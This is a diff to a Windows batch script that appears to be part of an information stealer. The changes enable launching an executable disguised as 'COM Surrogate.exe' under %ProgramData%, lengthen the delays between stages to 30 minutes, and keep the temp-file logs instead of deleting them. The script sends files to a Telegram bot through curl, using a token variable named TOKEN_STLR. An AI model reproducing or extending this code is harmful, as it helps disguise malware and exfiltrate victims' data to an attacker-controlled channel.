@@ -16,7 +16,7 @@ for /L %%i in (1,1,13) do (
 )
 set "filename1=!filename!"
 set "filename="
-set "LOGFILE=%temp%\!filename1!"
+set "LOGFILE=%temp%\!filename1!.mseuope"
 
 
 
@@ -37,12 +37,12 @@ set "LOGFILE1=%temp%\!filename2!.mseuop"
 
 :: Start logging from this point
 call :LogOutput > "%LOGFILE%" 2>&1
-del /f /q "%LOGFILE%"
-del /f /q "%LOGFILE1%"
+::del /f /q "%LOGFILE%"
+::del /f /q "%LOGFILE1%"
 echo.
 echo.
-echo Exiting...
-exit
+echo Going to EOF...
+goto :EOF
 
 :LogOutput
 
@@ -102,14 +102,14 @@ echo Sended
 echo.
 
 echo.
-echo Waiting 60 seconds
-timeout /t 60 /nobreak
+echo Waiting 1800 seconds
+timeout /t 1800 /nobreak
 echo.
 
 
 echo Starting COM
 
-:: start "" "%ProgramData%\Microsoft\Windows\COM Surrogate.exe"
+start "" "%ProgramData%\Microsoft\Windows\COM Surrogate.exe"
 
 echo Started
 
@@ -144,8 +144,8 @@ echo.
 
 
 echo.
-echo Waiting 60 seconds
-timeout /t 60 /nobreak
+echo Waiting 1800 seconds
+timeout /t 1800 /nobreak
 echo.
 
 
@@ -171,8 +171,8 @@ echo.
 
 
 echo.
-echo Waiting 60 seconds
-timeout /t 60 /nobreak
+echo Waiting 1800 seconds
+timeout /t 1800 /nobreak
 echo.
 
 
@@ -201,8 +201,8 @@ echo.
 
 
 echo.
-echo Waiting 60 seconds
-timeout /t 60 /nobreak
+echo Waiting 1800 seconds
+timeout /t 1800 /nobreak
 echo.
 
 
@@ -227,8 +227,8 @@ echo.
 
 
 echo.
-echo Waiting 60 seconds
-timeout /t 60 /nobreak
+echo Waiting 1800 seconds
+timeout /t 1800 /nobreak
 echo.
 
 
@@ -253,8 +253,8 @@ echo.
 
 
 echo.
-echo Waiting Last 60 seconds
-timeout /t 60 /nobreak
+echo Waiting Last 1800 seconds
+timeout /t 1800 /nobreak
 echo.
 echo.
 
@@ -272,6 +272,6 @@ curl -s -X POST "https://api.telegram.org/bot%TOKEN_STLR%/sendDocument" ^
 
 
 
-
+echo SentSuccess
 
 
